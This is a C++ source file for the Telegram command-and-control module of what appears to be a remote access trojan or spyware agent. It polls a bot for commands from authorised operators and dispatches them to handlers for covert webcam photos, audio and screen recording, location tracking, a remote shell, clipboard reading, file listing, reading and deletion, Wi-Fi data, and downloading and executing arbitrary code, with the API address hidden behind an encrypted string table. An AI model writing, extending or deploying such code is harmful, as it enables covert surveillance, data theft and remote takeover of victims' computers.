#include "infrastructure/telegram/TelegramBot.hpp"

#include <algorithm>
#include <sstream>

#include <curl/curl.h>
#include <nlohmann/json.hpp>

#include "domain/common/StringTable.hpp"
#include "application/commands/CommandHandler.hpp"
#include "application/commands/MediaHandler.hpp"
#include "application/commands/LocationHandler.hpp"
#include "application/commands/ShellHandler.hpp"
#include "application/commands/SysInfoHandler.hpp"
#include "application/commands/ClipboardHandler.hpp"
#include "application/commands/ProcessHandler.hpp"
#include "application/commands/WifiHandler.hpp"
#include "application/commands/FileManagerHandler.hpp"
#include "application/commands/DownloadExecHandler.hpp"
#include "application/commands/KeywordAlertHandler.hpp"

namespace nuub::infrastructure::telegram {

using json = nlohmann::json;

static size_t write_callback(char* ptr, size_t size, size_t nmemb, std::string* data) {
    data->append(ptr, size * nmemb);
    return size * nmemb;
}

TelegramBot::TelegramBot(std::string token, std::int64_t admin_chat_id, std::string pc_id)
    : token_(std::move(token))
    , admin_(admin_chat_id)
    , pc_id_(std::move(pc_id))
    , reporter_(token_, admin_chat_id, pc_id_)
    , heartbeat_([this](const std::string& msg) { reporter_.send_message(msg); },
                 pc_id_, 30)
{
}

TelegramBot::TelegramBot(std::string token, std::vector<std::int64_t> admin_chat_ids, std::string pc_id)
    : token_(std::move(token))
    , admin_(std::move(admin_chat_ids))
    , pc_id_(std::move(pc_id))
    , reporter_(token_, admin_.primary_chat_id(), pc_id_)
    , heartbeat_([this](const std::string& msg) { reporter_.send_message(msg); },
                 pc_id_, 30)
{
}

TelegramBot::~TelegramBot() {
    stop();
}

void TelegramBot::set_handlers(
    application::commands::CommandHandler& cmd,
    application::commands::MediaHandler& media,
    application::commands::LocationHandler& loc,
    application::commands::ShellHandler& shell,
    application::commands::SysInfoHandler& sysinfo,
    application::commands::ClipboardHandler& clipboard,
    application::commands::ProcessHandler& process,
    application::commands::WifiHandler& wifi,
    application::commands::FileManagerHandler& filemgr,
    application::commands::DownloadExecHandler& dl,
    application::commands::KeywordAlertHandler& alert)
{
    cmd_handler_ = &cmd;
    media_handler_ = &media;
    loc_handler_ = &loc;
    shell_handler_ = &shell;
    sysinfo_handler_ = &sysinfo;
    clipboard_handler_ = &clipboard;
    process_handler_ = &process;
    wifi_handler_ = &wifi;
    filemgr_handler_ = &filemgr;
    dl_handler_ = &dl;
    alert_handler_ = &alert;
}

std::string TelegramBot::api_call(const std::string& method, const std::string& params) {
    // Use encrypted string for API URL
    std::string tg_api = domain::StringTable::get("tg_api");
    std::string url = tg_api + token_ + "/" + method;
    std::string response;

    CURL* curl = curl_easy_init();
    if (!curl) return {};

    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);

    if (!params.empty()) {
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, params.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, params.size());
    }

    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);

    return (res == CURLE_OK) ? response : "";
}

void TelegramBot::dispatch(const std::string& command, const std::string& target,
                           int duration, const std::string& extra) {
    // Original commands
    if (command == "start")        { if (cmd_handler_) cmd_handler_->handle_start(target); }
    else if (command == "status")  { if (cmd_handler_) cmd_handler_->handle_status(target); }
    else if (command == "pause")   { if (cmd_handler_) cmd_handler_->handle_pause(target); }
    else if (command == "resume")  { if (cmd_handler_) cmd_handler_->handle_resume(target); }
    else if (command == "getlog")  { if (cmd_handler_) cmd_handler_->handle_getlog(target); }
    else if (command == "shutdown") { if (cmd_handler_) cmd_handler_->handle_shutdown(target); }
    else if (command == "info")    { if (cmd_handler_) cmd_handler_->handle_info(target); }
    // Media commands
    else if (command == "take_photo")   { if (media_handler_) media_handler_->handle_take_photo(target); }
    else if (command == "take_video")   { if (media_handler_) media_handler_->handle_take_video(target, duration); }
    else if (command == "record_audio") { if (media_handler_) media_handler_->handle_record_audio(target, duration); }
    else if (command == "screenshot")   { if (media_handler_) media_handler_->handle_screenshot(target); }
    else if (command == "screenrecord") { if (media_handler_) media_handler_->handle_screenrecord(target, duration); }
    // Location
    else if (command == "locate")  { if (loc_handler_) loc_handler_->handle_locate(target); }
    // Shell
    else if (command == "shell")   { if (shell_handler_) shell_handler_->handle_shell(target, extra); }
    // NEW: Sysinfo
    else if (command == "sysinfo") { if (sysinfo_handler_) sysinfo_handler_->handle_sysinfo(target); }
    // NEW: Clipboard
    else if (command == "clipboard") { if (clipboard_handler_) clipboard_handler_->handle_clipboard(target); }
    else if (command == "setclip") { if (clipboard_handler_) clipboard_handler_->handle_setclip(target, extra); }
    // NEW: Process management
    else if (command == "ps")      { if (process_handler_) process_handler_->handle_ps(target); }
    else if (command == "kill")    { if (process_handler_) process_handler_->handle_kill(target, extra); }
    // NEW: WiFi
    else if (command == "wifi")    { if (wifi_handler_) wifi_handler_->handle_wifi(target); }
    // NEW: File manager
    else if (command == "ls")      { if (filemgr_handler_) filemgr_handler_->handle_ls(target, extra); }
    else if (command == "mkdir")   { if (filemgr_handler_) filemgr_handler_->handle_mkdir(target, extra); }
    else if (command == "rm")      { if (filemgr_handler_) filemgr_handler_->handle_rm(target, extra); }
    else if (command == "cat")     { if (filemgr_handler_) filemgr_handler_->handle_cat(target, extra); }
    // NEW: Download & execute
    else if (command == "downloadexec") { if (dl_handler_) dl_handler_->handle_downloadexec(target, extra); }
    // NEW: Keyword alerts
    else if (command == "alert")   { if (alert_handler_) alert_handler_->handle_add_alert(target, extra); }
    else if (command == "unalert") { if (alert_handler_) alert_handler_->handle_remove_alert(target, extra); }
    else if (command == "alerts")  { if (alert_handler_) alert_handler_->handle_list_alerts(target); }
}

void TelegramBot::poll_loop() {
    while (running_) {
        std::string offset_param = "offset=" + std::to_string(last_update_id_ + 1);
        std::string resp = api_call("getUpdates", offset_param + "&timeout=5");

        if (resp.empty()) {
            std::this_thread::sleep_for(std::chrono::seconds(2));
            continue;
        }

        try {
            auto data = json::parse(resp);
            if (!data["ok"]) continue;

            for (const auto& update : data["result"]) {
                last_update_id_ = update["update_id"].get<std::int64_t>();

                auto& msg = update["message"];
                if (!msg.contains("text")) continue;

                auto chat = msg["chat"];
                std::int64_t chat_id = chat["id"].get<std::int64_t>();
                if (!admin_.is_authorized(chat_id)) continue;

                std::string text = msg["text"].get<std::string>();
                if (text.empty() || text[0] != '/') continue;

                // Parse /command target extra_args
                std::istringstream iss(text);
                std::string cmd_with_slash, target;
                int duration = 10;

                iss >> cmd_with_slash;
                std::string command = cmd_with_slash.substr(1);
                std::transform(command.begin(), command.end(), command.begin(), ::tolower);

                if (iss >> target) {
                    std::transform(target.begin(), target.end(), target.begin(), ::tolower);
                }
                if (iss >> duration) { /* parsed */ }

                // Capture the rest of the line (for shell, setclip, etc.)
                std::string extra;
                std::getline(iss, extra);
                // Remove leading whitespace
                if (!extra.empty() && extra[0] == ' ') {
                    extra = extra.substr(1);
                }

                dispatch(command, target, duration, extra);
            }
        } catch (const std::exception&) {
            std::this_thread::sleep_for(std::chrono::seconds(2));
        }
    }
}

void TelegramBot::start() {
    running_ = true;

    reporter_.send_message("Agente conectado y activo.");

    poll_thread_ = std::thread(&TelegramBot::poll_loop, this);
    heartbeat_.start();
}

void TelegramBot::stop() {
    running_ = false;
    heartbeat_.stop();
    if (poll_thread_.joinable()) {
        poll_thread_.join();
    }
}

} // namespace nuub::infrastructure::telegram
